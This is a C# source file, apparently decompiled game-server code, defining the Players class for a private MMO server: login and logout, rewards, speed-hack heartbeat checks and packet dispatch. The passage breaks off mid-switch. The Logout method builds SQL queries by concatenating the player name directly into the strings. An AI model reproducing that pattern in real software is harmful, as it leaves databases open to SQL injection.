using System;
using System.Collections;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Data;
using System.Data.SqlClient;
using System.Globalization;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Timers;
using RxjhServer.DbClss;
using RxjhServer.HelperTools;
using RxjhServer.Network;

namespace RxjhServer
{
	public class Players : PlayersBes, IDisposable
	{
		public DateTime movetime;

		private bool 是否人物登陆;

		private DateTime 延迟间隔 = DateTime.Now;

		public DateTime 红包系统time = DateTime.Now;

		private int idd = 10464;

		private int 元宝个人商店是否开通 = 1;

		private ConcurrentDictionary<int, HcItimesClass> 合成物品表 = new ConcurrentDictionary<int, HcItimesClass>();

		public DateTime 狮子吼time = DateTime.Now;

		public DateTime 发送消息time = DateTime.Now;

		private DateTime 移动时间 = DateTime.Now;

		public DateTime Pktime801303 = DateTime.Now;

		public DateTime Pktime801202 = DateTime.Now;

		public DateTime Pktime801301 = DateTime.Now;

		private readonly DateTime 攻击确认timer = DateTime.Now;

		public int Pk武功ID = -1;

		private readonly List<武功类> 武功l = new List<武功类>();

		private DateTime 吃药时间 = DateTime.Now;

		private DateTime 情侣移动time = DateTime.Now;

		private DateTime 传书时间 = DateTime.Now;

		public DateTime 攻击时间检查 = DateTime.Now;

		public System.Timers.Timer 自动坐标;

		private ThreadSafeDictionary<int, Players> PlayList;

		private MissionClass Mission;

		public int 外挂提示次数;

		public DateTime Pktime;

		public DateTime 攻击时间;

		public DateTime 平A攻击;

		private bool disposed;

		private bool 人物是否登陆;

		private bool 连接成功;

		public int PkID;

		public DateTime XTtime;

		public int times;

		public int 攻击确认时间;

		public int 石头剪子布赢次数;

		public System.Timers.Timer 预备申请仪式计时器;

		private DateTime 预备时间;

		public int 婚礼地图;

		public int 婚礼入场券;

		public int 婚礼模式;

		private int 名包宠物类型;

		private long 名包宠物id;

		public DateTime 使用大土time;

		public DateTime 使用百宝time;

		public int 元宝合成开关;

		private int 合成手续费;

		private float 上次坐标X;

		private float 上次坐标Y;

		private int yxsl;

		public float 移动中目标坐标X;

		public float 移动中目标坐标Y;

		public int 物理攻击人物ID;

		public System.Timers.Timer 自动攻击;

		public System.Timers.Timer 自动恢复;

		public System.Timers.Timer 自动复活;

		public System.Timers.Timer 回城计时器;

		private byte[] 解锁包;

		private int 解锁数量;

		public int 怒气;

		public int 怒点;

		public DateTime 切换PKtime;

		private readonly List<武功类> 武功类List = new List<武功类>();

		public int 超负荷等级 = 0;

		public int 神女虚弱ID = 0;

		public bool 人物移动中 = false;

		public int 当前攻击时间间隔 = 2000;

		public int 上次攻击人物ID;

		public int 连续攻击怪物次数;

		public int 攻击确认次数;

		public int 引怪次数;

		public bool 攻击可用标志;

		public int 判断是否用封包登陆 = 0;

		public int PK提示 = 0;

		public int 讨伐队队伍ID;

		public int 副本复活剩余次数;

		public new int 离线挂机当前攻击怪物;

		public int 自动补给药品;

		public new int 离线打架攻击人物;

		public Players(NetState client)
			: base(client)
		{
			讨伐队队伍ID = 0;
			副本复活剩余次数 = 0;
			自动补给药品 = 0;
			离线挂机当前攻击怪物 = 0;
			离线打架攻击人物 = 0;
			Mission = new MissionClass(this);
			PlayList = new ThreadSafeDictionary<int, Players>();
			XTtime = DateTime.Now;
			切换PKtime = DateTime.Now;
			使用大土time = DateTime.Now;
			使用百宝time = DateTime.Now;
			外挂提示次数 = 0;
			times = 0;
			攻击确认时间 = 0;
			Pktime = DateTime.Now;
			攻击时间 = DateTime.Now;
			平A攻击 = DateTime.Now;
			超负荷等级 = 0;
			神女虚弱ID = 0;
			人物移动中 = false;
			引怪次数 = 0;
			PK提示 = 1;
			最终致命一击 = 0;
		}

		~Players()
		{
			Dispose(disposing: false);
		}

		public void Dispose()
		{
			try
			{
				if (查坐标 != null)
				{
					查坐标.Enabled = false;
					查坐标.Close();
					查坐标.Dispose();
					查坐标 = null;
				}
				if (攻击器 != null)
				{
					攻击器.Close();
					攻击器.Dispose();
					攻击器 = null;
				}
				if (allChars != null)
				{
					allChars.Clear();
				}
				if (攻击列表 != null)
				{
					攻击列表.Clear();
				}
				if (新武功连击 != null)
				{
					新武功连击.Clear();
				}
				if (个人商店 != null)
				{
					个人商店 = null;
				}
				if (交易 != null)
				{
					交易 = null;
				}
				if (玉连环 != null)
				{
					玉连环.Clear();
				}
				if (得到门徽ID != null)
				{
					得到门徽ID.Clear();
					得到门徽ID = null;
				}
				if (PlayList != null)
				{
					PlayList.Clear();
					PlayList.Dispose();
					PlayList = null;
				}
				if (SerList != null)
				{
					SerList.Clear();
				}
				if (NpcList != null)
				{
					if (NpcList.Count > 0)
					{
						foreach (NpcClass value in NpcList.Values)
						{
							value.PlayList_Remove(this);
						}
					}
					NpcList.Clear();
					NpcList.Dispose();
					NpcList = null;
				}
				if (地面物品列表 != null)
				{
					地面物品列表.Clear();
					地面物品列表.Dispose();
					地面物品列表 = null;
				}
				if (追加状态列表 != null)
				{
					追加状态列表.Clear();
					追加状态列表.Dispose();
					追加状态列表 = null;
				}
				if (追加状态New列表 != null)
				{
					追加状态New列表.Clear();
					追加状态New列表.Dispose();
					追加状态New列表 = null;
				}
				if (异常状态 != null)
				{
					异常状态.Clear();
					异常状态.Dispose();
					异常状态 = null;
				}
				if (神女异常状态 != null)
				{
					神女异常状态.Clear();
					神女异常状态.Dispose();
					神女异常状态 = null;
				}
				if (自动攻击 != null)
				{
					自动攻击.Stop();
					自动攻击.Enabled = false;
					自动攻击.Close();
					自动攻击.Dispose();
					自动攻击 = null;
				}
				if (合成物品表 != null)
				{
					合成物品表.Clear();
					合成物品表 = null;
				}
				if (人物灵兽 != null)
				{
					清空灵兽状态();
				}
				if (任务 != null)
				{
					任务.Clear();
					任务 = null;
				}
				if (公有药品 != null)
				{
					公有药品.Clear();
					公有药品 = null;
				}
				if (升天气功 != null)
				{
					升天气功.Clear();
					升天气功 = null;
				}
				if (传书列表 != null)
				{
					传书列表.Clear();
					传书列表 = null;
				}
				if (tem != null)
				{
					tem.Clear();
					tem = null;
				}
				if (自动恢复 != null)
				{
					自动恢复.Enabled = false;
					自动恢复.Close();
					自动恢复.Dispose();
					自动恢复 = null;
					自动恢复 = null;
				}
				if (预备申请仪式计时器 != null)
				{
					预备申请仪式计时器.Enabled = false;
					预备申请仪式计时器.Close();
					预备申请仪式计时器.Dispose();
					预备申请仪式计时器 = null;
				}
				if (Mission != null)
				{
					Mission.Dispose();
					Mission = null;
				}
				disposed = true;
				if (移动地图计时器 != null)
				{
					移动地图计时器.Enabled = false;
					移动地图计时器.Close();
					移动地图计时器.Dispose();
					移动地图计时器 = null;
				}
				if (无敌时间计数器 != null)
				{
					无敌时间计数器.Enabled = false;
					无敌时间计数器.Close();
					无敌时间计数器.Dispose();
					无敌时间计数器 = null;
				}
				if (障力恢复时间计数器 != null)
				{
					障力恢复时间计数器.Enabled = false;
					障力恢复时间计数器.Close();
					障力恢复时间计数器.Dispose();
					障力恢复时间计数器 = null;
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "用户数据释放_Dispose()出错[" + ex.Message + "]");
			}
		}

		private void Dispose(bool disposing)
		{
			if (!disposed)
			{
				int num = (disposing ? 1 : 0);
			}
			disposed = true;
		}

		public void 位置封包(byte[] 封包数据, int 封包大小)
		{
			byte[] array = new byte[4];
			Buffer.BlockCopy(封包数据, 10, array, 0, 4);
			int value = BitConverter.ToInt32(array, 0);
			string hex = "AA551E00B1058700180037A60700000000000000000000000000000000000000000055AA";
			byte[] array2 = Converter.hexStringToByte(hex);
			Buffer.BlockCopy(BitConverter.GetBytes(value), 0, array2, 10, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array2, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array2, array2.Length);
			}
		}

		public void 删除背包物品(byte[] 封包数据, int 封包大小)
		{
			int num = -1;
			try
			{
				num = 封包数据[11];
			}
			catch
			{
			}
			if (num >= 0 && num <= 65)
			{
				物品类 物品类2 = 装备栏包裹[num];
				if (物品类2 != null)
				{
					系统提示("【" + 物品类2.得到物品名称() + "】删除成功！", 10, "删除背包物品");
					减去物品(num, 物品类2.Get物品数量);
				}
			}
			else
			{
				系统提示("参数错误", 10, "删除背包物品");
			}
		}

		public bool Logoin()
		{
			int num = 0;
			bool result = false;
			if (World.JlMsg == 1)
			{
				MainForm.WriteLine(0, "Players_Login");
			}
			try
			{
				if (查询已登陆帐号数量(base.Client.ToString()) >= World.允许多开数量)
				{
					MainForm.WriteLine(1, "IP[" + base.Client.ToString() + "]总数:[" + 查询已登陆帐号数量(base.Client.ToString()) + "]踢出");
					base.Client.Dispose();
				}
				else
				{
					客户端IP地址 value = new 客户端IP地址(base.Client.ToString());
					World.IpList.Add(base.人物全服ID, value);
					if (查询已登陆帐号数量(base.Client.ToString()) != 0)
					{
						MainForm.WriteLine(1, "IP[" + base.Client.ToString() + "]总数:[" + 查询已登陆帐号数量(base.Client.ToString()) + "]在线:[" + (World.记录多开数量 + 1) + "]");
					}
					else
					{
						MainForm.WriteLine(1, "信任IP[" + base.Client.ToString() + "].可以无限多开.......");
					}
				}
				World.AllConnectedPlayers.Add(base.人物全服ID, this);
				MainForm.WriteLine(3, "人物登陆[" + base.Userid + "]-[" + base.UserName + "] 元宝[" + base.FLD_RXPIONT + "]");
				查坐标 = new System.Timers.Timer(6000.0);
				查坐标.Elapsed += MoveAll;
				查坐标.AutoReset = true;
				查坐标.Enabled = true;
				攻击器 = new System.Timers.Timer(100.0);
				攻击器.Elapsed += 攻击延迟_Elapsed;
				攻击器.AutoReset = true;
				攻击器.Enabled = true;
				if (base.是否假人 == 0)
				{
					RxjhClass.登陆记录(base.Userid, base.UserName, base.Client.ToString(), "登陆:元宝[" + base.FLD_RXPIONT + "]");
				}
				result = true;
				人物是否登陆 = true;
			}
			catch (Exception ex)
			{
				OpClient(1);
				base.Client.Dispose();
				MainForm.WriteLine(100, "Logoin()出错![" + base.Userid + "]-[" + base.UserName + "][" + base.人物全服ID + "]" + ex.ToString());
			}
			return result;
		}

		public void 切换PK模式(int PK)
		{
			byte[] array = Converter.hexStringToByte("AA550800930416100200020055AA");
			Buffer.BlockCopy(BitConverter.GetBytes(PK), 0, array, 10, 1);
			base.人物PK模式 = PK;
			心跳次数阀值 = 3;
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 比武泡点奖励(int i)
		{
			try
			{
				foreach (比武泡点奖励 value in World.比武泡点奖励.Values)
				{
					if (i != value.排名)
					{
						continue;
					}
					if (value.武勋 != 0)
					{
						base.Player_WuXun += value.武勋;
						系统提示("比武第" + value.名次 + "排名,获得到武勋" + value.武勋 + "点！", 20, "比武泡点");
						更新武功和状态();
					}
					if (value.套装 != 0)
					{
						int num = GetEmptyBagSlot();
						if (num == -1)
						{
							系统提示("背包没有空位了， 赶快清理下吧。", 20, "比武泡点");
							break;
						}
						增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(value.套装), num, BitConverter.GetBytes(1), new byte[56], 绑定: false);
						系统提示("比武第" + value.名次 + "排名,获得一件装备。快快打开看吧", 20, "比武泡点");
					}
					if (value.元宝 != 0)
					{
						CheckTreasureGems();
						检察元宝数据(value.元宝, 1, "比武泡点");
						系统提示("比武第" + value.名次 + "排名,获得到" + value.元宝 + "个元宝！", 20, "等级奖励");
						SaveGemData();
					}
					if (value.钻石 != 0)
					{
						CheckTreasureGems();
						CheckGemPointsData(value.钻石, 1, "比武泡点");
						系统提示("比武第" + value.名次 + "排名,获得到" + value.钻石 + "个钻石！", 20, "比武泡点");
						SaveGemData();
					}
					if (value.金钱 != "")
					{
						base.Player_Money += long.Parse(value.金钱);
						系统提示("比武第" + value.名次 + "排名,获得到游戏币" + value.金钱 + "两！", 20, "比武泡点");
						得到钱的提示(uint.Parse(value.金钱));
						更新金钱和负重();
					}
					if (value.单件物品 != "")
					{
						int num2 = GetEmptyBagSlot();
						if (num2 == -1)
						{
							系统提示("背包没有空位了， 赶快清理下吧。", 20, "比武泡点");
							break;
						}
						string[] array = value.单件物品.Split(';');
						AddItemWithProperties(int.Parse(array[0]), num2, int.Parse(array[1]), int.Parse(array[2]), int.Parse(array[3]), int.Parse(array[4]), int.Parse(array[5]), int.Parse(array[6]), int.Parse(array[7]), int.Parse(array[8]), int.Parse(array[9]), int.Parse(array[10]), int.Parse(array[11]));
						系统提示("比武第" + value.名次 + "排名,获得一件奖品。快快打开看吧", 20, "比武泡点");
					}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "比武泡点奖励系统出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 新使用物品提示发送(int 物品位置, int 物品PID, int 使用提示, int 剩余数量, int 目标ID)
		{
			using 发包类 发包类 = new 发包类();
			发包类.Write1(1);
			发包类.Write1(物品位置);
			发包类.Write2(0);
			发包类.Write8(物品PID);
			发包类.Write4(使用提示);
			发包类.Write4(剩余数量);
			发包类.Write4(0);
			发包类.Write4(目标ID);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 15104, base.人物全服ID);
			}
		}

		public void Logout()
		{
			int num = 0;
			try
			{
				if (!连接成功)
				{
					return;
				}
				if (World.AllConnectedPlayers.TryGetValue(base.人物全服ID, out var value))
				{
					if (World.申请势力人物列表.ContainsKey(base.UserName))
					{
						World.申请势力人物列表.TryRemove(base.UserName, out value);
					}
					if (World.申请仙魔大战人物列表.ContainsKey(base.UserName))
					{
						World.申请仙魔大战人物列表.TryRemove(base.UserName, out value);
					}
					if (base.是否假人 == 0)
					{
						RxjhClass.登陆记录(base.Userid, base.UserName, base.Client.ToString(), "登出");
					}
					if (base.人物坐标_地图 == 801 && World.当前是否是银币线路 == 1)
					{
						if (base.Player_Zx == 1)
						{
							if (World.势力战正派参战人数 > 0)
							{
								World.势力战正派参战人数--;
							}
						}
						else if (base.Player_Zx == 2)
						{
							World.势力战邪派参战人数--;
						}
					}
					if (base.人物坐标_地图 == 41001 && World.仙魔大战进程 != 0)
					{
						World.conn.发送("仙魔大战掉线|" + base.UserName + "|" + base.仙魔大战派别);
						DBA.ExeSqlCommand("UPDATE TBL_仙魔大战 SET FLD_在线=0 WHERE FLD_名字='" + base.UserName + "'");
						DataTable dBToDataTable = DBA.GetDBToDataTable("SELECT * FROM TBL_仙魔大战 WHERE FLD_种族 = '仙族' AND FLD_在线=1");
						DataTable dBToDataTable2 = DBA.GetDBToDataTable("SELECT * FROM TBL_仙魔大战 WHERE FLD_种族 = '魔族' AND FLD_在线=1");
						World.仙魔大战正人数 = dBToDataTable.Rows.Count;
						World.仙魔大战邪人数 = dBToDataTable2.Rows.Count;
						World.conn.发送("仙魔大战人数|" + World.仙魔大战正人数 + "|" + World.仙魔大战邪人数);
					}
					bool flag = false;
					foreach (坐标Class item in World.移动)
					{
						if (item.Rxjh_Map == base.人物坐标_地图)
						{
							flag = true;
							break;
						}
					}
					if (!flag)
					{
						if (World.老泫勃派开关 == 1)
						{
							base.人物坐标_地图 = 29000;
							base.人物坐标_X = 495f;
							base.人物坐标_Y = 1727f;
						}
						else
						{
							base.人物坐标_地图 = 101;
							base.人物坐标_X = 575f;
							base.人物坐标_Y = 1565f;
						}
					}
					if (base.人物坐标_地图 != 7001)
					{
						if (base.人物坐标_地图 == 7101)
						{
							if (World.血战 != null && World.血战.结束 == 0)
							{
								if (World.血战.帮战主方.申请帮派ID == base.帮派Id)
								{
									if (World.血战.帮战主方.申请人物列表.ContainsKey(base.人物全服ID))
									{
										if (base.帮派人物等级 == 6)
										{
											World.血战.主方分数 = 0;
											World.血战.客方分数 = 0;
											World.血战.结束 = 2;
											World.血战.Dispose();
										}
										else
										{
											World.血战.主方分数--;
											World.血战.帮战主方.申请人物列表.TryRemove(base.人物全服ID, out value);
										}
										关起来 = 0;
										帮战开始提示(1, 0);
									}
								}
								else if (World.血战.帮战客方.申请帮派ID == base.帮派Id && World.血战.帮战客方.申请人物列表.ContainsKey(base.人物全服ID))
								{
									if (base.帮派人物等级 == 6)
									{
										World.血战.主方分数 = 0;
										World.血战.客方分数 = 0;
										World.血战.结束 = 2;
										World.血战.Dispose();
									}
									else
									{
										World.血战.客方分数--;
										World.血战.帮战客方.申请人物列表.TryRemove(base.人物全服ID, out value);
									}
									关起来 = 0;
									帮战开始提示(1, 0);
								}
							}
							if (World.老泫勃派开关 == 1)
							{
								移动(495f, 1727f, 15f, 29000);
							}
							else
							{
								移动(529f, 1528f, 15f, 101);
							}
						}
						else if (base.人物坐标_地图 == 7301 && World.GuildWar != null)
						{
							if (World.老泫勃派开关 == 1)
							{
								移动(495f, 1727f, 15f, 29000);
							}
							else
							{
								移动(415f, 1528f, 15f, 101);
							}
							帮战开始提示(0, 0);
						}
					}
					保存人物数据存储过程();
					保存个人仓库存储过程();
					保存综合仓库存储过程();
					保存宠物仓库存储过程();
					保存灵兽仓库存储过程();
					World.AllConnectedPlayers.Remove(base.人物全服ID);
					if (World.IpList.ContainsKey(base.人物全服ID))
					{
						World.IpList.RemoveSafe(base.人物全服ID);
					}
					if (World.参加红包列表.Contains(this))
					{
						World.参加红包列表.Remove(this);
					}
					if (base.FLD_情侣.Length != 0)
					{
						Players players = World.检查玩家name(base.FLD_情侣);
						players?.更新情侣系统(1, base.UserName, players.婚戒刻字, players.解除关系倒计时, DateTime.Now);
					}
					清空追加状态New列表();
					清空追加状态列表();
					异常状态列表();
					num = 2;
					离开当前地图();
					num = 3;
					怪物攻击列表.Clear();
					num = 12;
					if (组队id != 0 && World.Teams.TryGetValue(组队id, out var value2))
					{
						value2.退出(this, 1);
					}
					num = 4;
					if (个人商店 != null && 个人商店.个人商店是否开启)
					{
						if (个人商店.商店类型 == 1)
						{
							关店();
						}
						else if (个人商店.商店类型 == 2)
						{
							元宝个人商店关店();
						}
					}
					num = 5;
					if (进店中 && 进店中ID != 0)
					{
						Players players2 = 得到人物数据(进店中ID);
						if (players2 != null && players2.个人商店 != null)
						{
							if (players2.个人商店.商店类型 == 1)
							{
								出店(进店中ID);
							}
							else if (players2.个人商店.商店类型 == 2)
							{
								元宝个人商店出店(进店中ID);
							}
						}
					}
					num = 6;
					if (人物灵兽 != null)
					{
						清空灵兽状态();
					}
					num = 7;
					if (交易 != null && 交易.交易中)
					{
						关闭交易(152, 0, 6);
					}
					num = 8;
					MainForm.WriteLine(3, "人物退出[" + base.Userid + "]-[" + base.UserName + "]");
				}
				else
				{
					MainForm.WriteLine(3, "人物退出2[" + base.Userid + "]-[" + base.UserName + "]");
				}
				num = 8;
				if (查坐标 != null)
				{
					查坐标.Enabled = false;
					查坐标.Close();
					查坐标.Dispose();
					查坐标 = null;
				}
				if (攻击器 != null)
				{
					攻击器.Close();
					攻击器.Dispose();
					攻击器 = null;
				}
				if (自动坐标 != null)
				{
					自动坐标.Enabled = false;
					自动坐标.Close();
					自动坐标.Dispose();
					自动坐标 = null;
				}
				num = 10;
				if (快捷栏 != null)
				{
					快捷栏.Clear();
				}
				num = 11;
				if (自动恢复 != null)
				{
					自动恢复.Enabled = false;
					自动恢复.Close();
					自动恢复.Dispose();
					自动恢复 = null;
				}
				if (自动攻击 != null)
				{
					自动攻击.Stop();
					自动攻击.Enabled = false;
					自动攻击.Close();
					自动攻击.Dispose();
					自动攻击 = null;
				}
				if (移动地图计时器 != null)
				{
					移动地图计时器.Enabled = false;
					移动地图计时器.Close();
					移动地图计时器.Dispose();
				}
				if (无敌时间计数器 != null)
				{
					无敌时间计数器.Enabled = false;
					无敌时间计数器.Close();
					无敌时间计数器.Dispose();
				}
				if (障力恢复时间计数器 != null)
				{
					障力恢复时间计数器.Enabled = false;
					障力恢复时间计数器.Close();
					障力恢复时间计数器.Dispose();
					障力恢复时间计数器 = null;
				}
				base.人物PK模式 = 0;
				if (讨伐队队伍ID != 0)
				{
					讨伐战队伍类.退出讨伐队(this, null, 0);
				}
			}
			catch (Exception ex)
			{
				World.AllConnectedPlayers.Remove(base.人物全服ID);
				MainForm.WriteLine(100, "出错!Logout用户[" + base.Userid + "]-[" + base.UserName + "] Logout() 出错ID" + num + " " + ex.Message);
			}
		}

		public void 异常状态列表()
		{
			if (异常状态 == null || 异常状态.Count == 0)
			{
				return;
			}
			try
			{
				foreach (异常状态类 value in 异常状态.Values)
				{
					value.时间结束事件();
					异常状态.Remove(value.FLD_PID);
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "异常状态列表列表出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 清空追加状态New列表()
		{
			if (World.JlMsg == 1)
			{
				MainForm.WriteLine(0, "Players_清空追加状态New列表");
			}
			if (追加状态New列表 == null)
			{
				return;
			}
			Queue queue = Queue.Synchronized(new Queue());
			try
			{
				foreach (追加状态New类 value in 追加状态New列表.Values)
				{
					queue.Enqueue(value);
				}
				while (queue.Count > 0)
				{
					if (World.JlMsg == 1)
					{
						MainForm.WriteLine(0, "清空追加状态New列表");
					}
					追加状态New类 追加状态New类2 = (追加状态New类)queue.Dequeue();
					if (追加状态New列表 != null)
					{
						追加状态New列表.Remove(追加状态New类2.FLD_PID);
					}
					追加状态New类2.Dispose();
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "追加状态New列表出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
			finally
			{
			}
		}

		public void 清空追加状态列表()
		{
			if (追加状态列表 == null || 追加状态列表.Count == 0)
			{
				return;
			}
			Queue queue = Queue.Synchronized(new Queue());
			try
			{
				foreach (追加状态类 value in 追加状态列表.Values)
				{
					queue.Enqueue(value);
				}
				while (queue.Count > 0)
				{
					追加状态类 追加状态类2 = (追加状态类)queue.Dequeue();
					追加状态列表.Remove(追加状态类2.FLD_PID);
					追加状态类2.时间结束事件();
					追加状态类2.Dispose();
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "清空追加状态列表出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public override void 发送当前范围广播数据(发包类 pak, int id, int wordid)
		{
			try
			{
				if (PlayList == null)
				{
					return;
				}
				foreach (Players value in PlayList.Values)
				{
					if (value.Client != null && value.Client.Running)
					{
						value.Client.SendPak(pak, id, wordid);
					}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "发送当前范围广播数据出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public override void 发送当前范围广播数据(byte[] data, int length)
		{
			if (World.JlMsg == 1)
			{
				MainForm.WriteLine(0, "Players_发送当前范围广播数据");
			}
			try
			{
				if (PlayList == null)
				{
					return;
				}
				foreach (Players value in PlayList.Values)
				{
					if (value.Client != null && value.Client.Running)
					{
						value.Client.Send(data, length);
					}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "发送当前范围广播数据出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 发送当前范围广播数据多包(byte[] data, int length)
		{
			if (World.JlMsg == 1)
			{
				MainForm.WriteLine(0, "Players_发送当前范围广播数据多包");
			}
			try
			{
				if (PlayList == null)
				{
					return;
				}
				foreach (Players value in PlayList.Values)
				{
					if (value.Client != null && value.Client.Running)
					{
						value.Client.Send多包(data, length);
					}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "发送当前范围广播数据出错多包![" + base.Userid + "]-[" + base.UserName + "]" + ex);
			}
		}

		public void 冲级奖励()
		{
			try
			{
				foreach (等级奖励类 value in World.等级奖励.Values)
				{
					if (base.Player_Level != value.等级)
					{
						continue;
					}
					if (value.武勋 != 0)
					{
						base.Player_WuXun += value.武勋;
						系统提示("得到武勋" + value.武勋 + "点！", 20, "[系统]");
						更新武功和状态();
					}
					if (value.套装 != 0)
					{
						int num = GetEmptyBagSlot();
						if (num == -1)
						{
							系统提示("背包没有空位了， 赶快清理下吧。", 20, "等级奖励");
							break;
						}
						增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(value.套装), num, BitConverter.GetBytes(1), new byte[56], 绑定: false);
						系统提示("恭喜你获得一套装备。快快打开看吧", 20, "等级奖励");
					}
					if (value.元宝 != 0)
					{
						CheckTreasureGems();
						检察元宝数据(value.元宝, 1, "等级奖励");
						系统提示("得到" + value.元宝 + "个元宝！", 20, "等级奖励");
						SaveGemData();
					}
					if (value.金钱 != "")
					{
						base.Player_Money += long.Parse(value.金钱);
						系统提示("得到游戏币" + value.金钱 + "两！", 20, "等级奖励");
						得到钱的提示(uint.Parse(value.金钱));
						更新金钱和负重();
					}
					if (value.单件物品 != "")
					{
						int num2 = GetEmptyBagSlot();
						if (num2 == -1)
						{
							系统提示("背包没有空位了， 赶快清理下吧。", 20, "等级奖励");
							break;
						}
						string[] array = value.单件物品.Split(';');
						AddItemWithProperties(int.Parse(array[0]), num2, int.Parse(array[1]), int.Parse(array[2]), int.Parse(array[3]), int.Parse(array[4]), int.Parse(array[5]), int.Parse(array[6]), int.Parse(array[7]), int.Parse(array[8]), int.Parse(array[9]), int.Parse(array[10]), int.Parse(array[11]));
						系统提示("恭喜你获得一件奖品。快快打开看吧", 20, "等级奖励");
					}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "等级奖励系统出错! [" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 心跳检测(byte[] data, int length)
		{
			try
			{
				if (World.心跳检测开关 != 1)
				{
					return;
				}
				if ((int)DateTime.Now.Subtract(XTtime).TotalMilliseconds < World.心跳检测时间阀值)
				{
					times++;
					if (times > 心跳次数阀值)
					{
						系统提示("游戏运行速度异常，请切换线路或关闭加速器。", 6, "系统提示");
						if (base.是否假人 == 0)
						{
							RxjhClass.卡号记录(base.Userid, base.UserName, "心跳检测", base.Player_Job);
							base.Client.Dispose();
						}
					}
				}
				XTtime = DateTime.Now;
			}
			catch
			{
			}
		}

		public void 加密更新()
		{
			ushort num = 40;
			ushort num2 = 34;
			Random random = new Random();
			ushort num3 = (ushort)random.Next(32, 151);
			byte[] array = new byte[num3];
			for (int i = 0; i < array.Length; i++)
			{
				array[i] = (byte)random.Next(1, 256);
			}
			base.Client.m_ep.Set(array);
			num = (ushort)(num + (ushort)(num3 + 2));
			num2 = (ushort)(num2 + (ushort)(num3 + 2));
			byte[] array2 = new byte[num + 6];
			byte[] array3 = Converter.hexStringToByte("C70345031A00010001007761746572696E6761000000000000000000000000000000000000000000");
			Buffer.BlockCopy(array3, 0, array2, 4, array3.Length);
			Buffer.BlockCopy(BitConverter.GetBytes(num3), 0, array2, 4 + array3.Length, 2);
			Buffer.BlockCopy(array, 0, array2, 6 + array3.Length, array.Length);
			Buffer.BlockCopy(BitConverter.GetBytes(num), 0, array2, 2, 2);
			Buffer.BlockCopy(BitConverter.GetBytes((ushort)base.人物全服ID), 0, array2, 4, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(num2), 0, array2, 8, 2);
			Buffer.BlockCopy(BitConverter.GetBytes((ushort)21930), 0, array2, 0, 2);
			Buffer.BlockCopy(BitConverter.GetBytes((ushort)43605), 0, array2, array2.Length - 2, 2);
			if (base.Client != null)
			{
				base.Client.Send(array2, array2.Length);
			}
		}

		public void 验证ID登陆(byte[] 封包数据, int 封包大小)
		{
			if (World.是否加密 == 1)
			{
				加密更新();
				return;
			}
			byte[] array = Converter.hexStringToByte("AA552800C70345031A00010001007761746572696E676100000000000000000000000000000000000000000055AA");
			Buffer.BlockCopy(封包数据, 14, array, 14, 12);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void unkown()
		{
			byte[] array = Converter.hexStringToByte("AA551600BF05391608007714560401000000000000000000CAC755AA");
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send单包(array, array.Length);
			}
		}

		public void ManagePacket(byte[] data, int length)
		{
			int num = BitConverter.ToInt16(data, 8);
			try
			{
				List<byte> list = new List<byte>(data);
				list.RemoveRange(6, 2);
				length -= 2;
				data = list.ToArray();
				Buffer.BlockCopy(BitConverter.GetBytes(data.Length - 6), 0, data, 2, 2);
				int num2 = BitConverter.ToInt16(data, 6);
				num = num2;
				if (!World.AllConnectedPlayers.TryGetValue(base.人物全服ID, out var _))
				{
					switch (num)
					{
					case 16:
						获取人物列表(data, length);
						break;
					case 1:
						连接登陆(data, length);
						break;
					case 3:
						退出(data, length);
						break;
					case 5:
						人物登陆(data, length);
						break;
					case 56:
						检查人物是否存在(data, length);
						break;
					case 30:
						删除人物(data, length);
						break;
					case 20:
						创建人物(data, length);
						break;
					case 218:
						换线验证(data, length);
						break;
					case 211:
						换线验证(data, length);
						break;
					case 143:
						显示();
						break;
					case 5638:
					case 8212:
						版本验证(data, length);
						break;
					case 836:
						验证ID登陆(data, length);
						break;
					}
					return;
				}
				switch (num)
				{
				case 14:
				case 26:
				case 58:
				case 80:
				case 144:
				case 146:
				case 148:
				case 153:
				case 203:
				case 206:
				case 212:
					检查背包复制(this);
					break;
				}
				switch (num)
				{
				case 6424:
					江湖小助手(data, length);
					break;
				case 1280:
					讨伐战队伍类.讨伐队管理(this, data, length);
					break;
				case 14:
					扔物品(data, length);
					break;
				case 3:
					退出(data, length);
					break;
				case 7:
					人物移动(data, length);
					break;
				case 1293:
					神龙移动(data, length);
					break;
				case 8:
					说话(data, length);
					break;
				case 9:
					if (江湖小助手打怪模式 == 0)
					{
						攻击(data, length);
					}
					break;
				case 11:
					捡物品(data, length);
					break;
				case 26:
					更换装备(data, length);
					break;
				case 22:
					更新配置(data, length);
					break;
				case 23:
					激活斗神称号(data, length);
					break;
